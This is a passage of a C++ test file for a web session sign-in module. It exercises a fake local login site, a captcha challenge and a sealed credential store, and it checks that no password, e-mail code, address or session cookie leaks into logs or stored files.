            const TAssetStoreStatus second = signIn.SignIn( WEBSIGNIN_MODE_INTERACTIVE, &message );
            ASSERT_TRUE( ASSETSTORE_STATUS_OK == second );
            if ( ASSETSTORE_STATUS_OK != second )
                GUCEF_ERROR_LOG( CORE::LOGLEVEL_IMPORTANT, "WebSignIn test: the second real browser sign in ended with " << AssetStoreStatusToString( second ) << ": " << message );
            ASSERT_TRUE( 1 == recorder.ownerActions && recorder.lastKind == "captcha" );
            ASSERT_TRUE( site.GetStats().goodPasswords == passwordsBefore + 1 );
            jar->Clear();
            signIn.ApplySessionTo( *jar );
            ASSERT_TRUE( 200 == GetLibrary( site, jar, response ) );
            site.SetChallenge( false );

            CORE::DeleteDir( profile, true );
        }
        catch( ... )
        {
            ERRORHERE;
        }
    GUCEF_TESTFW_TESTCASE_END
}

/*-------------------------------------------------------------------------*/

void
PerformWebSignInTests( void )
{
    GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "COMMENCING web session sign in TESTS" );

    // every log line of these tests is kept, to check that nothing secret is in one
    TESTFW::CLogTextCapture capture;

    PerformLoginScriptTests();

    // sessions and credentials in a sealed file when the AEAD codec is there, else in memory
    const CORE::CString storeFolder = TestDirectory( "websignin-credentials" );
    if ( CORE::DirExists( storeFolder ) )
        CORE::DeleteDir( storeFolder, true );
    CORE::CreateDirs( storeFolder );
    const bool sealed = AUTH::CFileCredentialStore::IsAvailable();
    if ( !sealed )
        GUCEF_WARNING_LOG( CORE::LOGLEVEL_IMPORTANT, "WebSignIn tests: the AEAD codec (codecspluginMONOCYPHER) is not loaded, the credential store is in memory and the sealing is not checked" );
    AUTH::CFileCredentialStore fileStore( storeFolder );
    AUTH::CMemoryCredentialStore memoryStore;
    AUTH::ICredentialStore& store = sealed ? static_cast< AUTH::ICredentialStore& >( fileStore ) : static_cast< AUTH::ICredentialStore& >( memoryStore );

    PerformSessionTests( store, storeFolder, sealed );

    CFakeLoginSite site;
    {
        GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.FakeSite" );
        GUCEF_TESTFW_TESTCASE( "Test: The fake login site starts" )
            try
            {
                ASSERT_TRUE( site.Start() );
            }
            catch( ... )
            {
                ERRORHERE;
            }
        GUCEF_TESTFW_TESTCASE_END
    }
    PerformFakeSiteTests( site, store, storeFolder, sealed );
    PerformRealBrowserTests( site );

    {
        GUCEF_TESTFW_SUITE_SCOPE( "WebSignIn.Secrets" );
        GUCEF_TESTFW_TESTCASE( "Test: No password, e-mail code, address or session cookie reached a log or the credential store files" )
            try
            {
                CORE::CString::StringVector secrets = site.GetIssuedSessionValues();
                ASSERT_FALSE( secrets.empty() );
                secrets.push_back( TestPassword );
                secrets.push_back( TestEmailCode );
                secrets.push_back( TestEmail );
                secrets.push_back( "cookieSecretValue42" );
                for ( size_t i=0; i<secrets.size(); ++i )
                {
                    ASSERT_FALSE( capture.Contains( secrets[ i ] ) );
                    if ( sealed )
                        ASSERT_FALSE( FolderHolds( storeFolder, secrets[ i ] ) );
                }
                ASSERT_TRUE( capture.Contains( "WebSessionSignIn(fakeweb)" ) );     // the sign ins did log
            }
            catch( ... )
            {
                ERRORHERE;
            }
        GUCEF_TESTFW_TESTCASE_END
    }

    site.Stop();
    fileStore.Wipe();
    CORE::DeleteDir( storeFolder, true );
    CORE::CLogStreamScope::FlushLogs();
    GUCEF_LOG( CORE::LOGLEVEL_NORMAL, "ALL web session sign in TESTS COMPLETED" );
}

/*-------------------------------------------------------------------------*/
